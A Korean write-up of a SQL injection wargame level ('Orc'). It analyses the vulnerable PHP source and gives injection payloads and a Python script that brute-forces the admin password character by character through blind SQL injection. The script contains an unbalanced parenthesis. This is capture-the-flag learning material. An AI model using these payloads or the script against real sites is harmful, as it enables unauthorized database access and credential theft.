# Lord of SQL Injection No.4 - Orc
## 문제 출제 의도
기본적인 Blind SQL을 할 수 있는지 확인한다.
## 소스 코드 분석
+ 소스 코드  
Orc의 소스코드는 다음과 같다.
    ~~~
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello admin</h2>"; 
    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
    highlight_file(__FILE__); 
    ?>
    ~~~
+ 소스 코드 분석
    - 금지 문자, 문자열
        + GET 방식으로 입력 받은 pw값에 prob _ . () 중 하나라도 있다면 "No Hack ~_~"이 출력되고 문제 풀이에 실패한다.
    - addslashes 함수
        ~~~
        string addslashes ( string $str )
        ~~~
        *  특수문자로 부터 발생될 수 있는 에러를 피하기위해 특수문자 앞에 역슬래쉬를 붙여주는 역활을하는 함수.
        * 원래대로 돌려줄때는 백슬레쉬를 제거해주는 stripslashes() 함수를 쓴다.
    - 풀이 성공 조건
        * 데이터베이스에서 받은 pw값이 0이 아니라면 "Hello admin"이 출력된다.
        * 데이터베이스에서 받은 pw와 GET방식으로 전달받은 pw가 같아야 한다.

## 문제 해결
+ pw길이
    - 직접 패스워드를 알아야 함으로 우선 비밀번호가 몇 글자인지 알아야 한다.
    - 따라서 URL 뒤에 다음과 같은 문자열을 추가 하여 확인 가능하다.
    ~~~
    ?pw=' or id='admin' and length(pw)=8-- -
    ~~~
    - 이는 Hello admin을 출력하게 만들기 때문에 우리는 pw가 8자리인 것을 알 수 있다.
+ pw값
    - substr함수
        * substr은 다음과 같은 형식을 취한다.
        ~~~
        substr(대상문자열,시작index, 길이)
        ~~~
        * 문자열을 자르는 함수이다. 시작 인덱스에서 길이만큼 문자열을 자른다.
        * 이를 통해 문자열을 잘라 문자를 하나씩 알아낸다.

    - 위 방법과 유사하게 한글자씩 알아내는 것은 코드를 이용하여 풀면 편하다.  
    - 다음과 같은 파이썬 코드를 이용하면 pw값을 쉽게 알 수 있다.
    ~~~
    import urllib.request
    from urllib.parse import quote
    key = ""
    for i in range(1, 9):
        for j in range(48, 127):
            url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="
            data="' or id='admin' and substr(pw,1,{})='{}'#".format(str(i), key + chr(j)
            print(data)

            data = quote(data)
            re = urllib.request.Request(url + data)
            re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36") 
            re.add_header("Cookie", "PHPSESSID=4p56htpvcookallo00ondblnf6")

            res = urllib.request.urlopen(re)

            if str(res.read()).find("Hello admin") != -1:
                key += chr(j).lower()
                print(key)
                break
    print(key)
    ~~~
    - 위 코드를 실행하면 295d5844가 출력된다. 이를 pw값에 GET 방식으로 입력하면 해결된다.